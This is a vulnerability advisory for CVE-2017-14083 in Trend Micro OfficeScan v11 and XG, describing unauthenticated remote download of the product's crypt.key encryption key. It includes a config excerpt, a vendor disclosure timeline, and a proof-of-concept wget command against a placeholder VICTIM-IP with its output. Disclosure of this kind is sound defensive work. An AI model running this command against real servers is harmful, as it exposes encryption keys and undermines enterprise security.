@@ -1,0 +1,113 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-14083-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-REMOTE-ENCRYPTION-KEY-DISCLOSURE.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==================
+www.trendmicro.com
+
+
+
+Product:
+========
+OfficeScan 
+v11.0 and XG (12.0)*
+
+
+OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
+An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
+manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
+web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
+
+
+
+Vulnerability Type:
+===================
+Unauthorized Encryption Key Disclosure
+
+
+
+CVE Reference:
+==============
+CVE-2017-14083
+
+
+
+Security Issue:
+================
+Remote unauthenticated attackers who can reach the TrendMicro OfficeScan XG application which usually runs on port 4343 can download
+the OfficeScan XG encryption "crypt.key" file. This crypt.key is used for the OfficeScan XG encryption process.
+
+
+References:
+===========
+https://success.trendmicro.com/solution/1118372
+
+
+e.g.
+
+In "config.php" 
+
+/* *********************************************************
+     * Encryption module configurations
+     */
+$wfconf_wfcrypt_keyfile = dirname(__FILE__) . "/../repository/inc/class/common/crypt/crypt.key";            <============= HERE 
+$wfconf_wfcrypt_algorithm = MCRYPT_RIJNDAEL_256; // MCRYPT_3DES MCRYPT_BLOWFISH MCRYPT_CAST_256 MCRYPT_DES ...
+/* *********************************************************
+     * Framework configurations
+     */
+
+
+
+Exploit/POC:
+=============
+
+[root@localhost /]# wget --no-check-certificate  https://VICTIM-IP:4343/officescan/console/html/widget/repository/inc/class/common/crypt/crypt.key
+--14:59:52--  https://VICTIM-IP:4343/officescan/console/html/widget/repository/inc/class/common/crypt/crypt.key
+Connecting to VICTIM-IP:4343... connected.
+WARNING: cannot verify VICTIM-IP's certificate, issued by `/CN=VICTIM-IP':
+  Self-signed certificate encountered.
+HTTP request sent, awaiting response... 200 OK
+Length: 32 [application/octet-stream]
+Saving to: `crypt.key'
+
+100%[==================================================================================================>] 32          --.-K/s   in 0s     
+
+14:59:52 (15.3 MB/s) - `crypt.key' saved [32/32]
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=================================
+Vendor Notification: May 31, 2017
+Vendor: "hotfix in progress". June 23, 2017
+Vendor releases fixes / advisory : September 27, 2017
+September 28, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
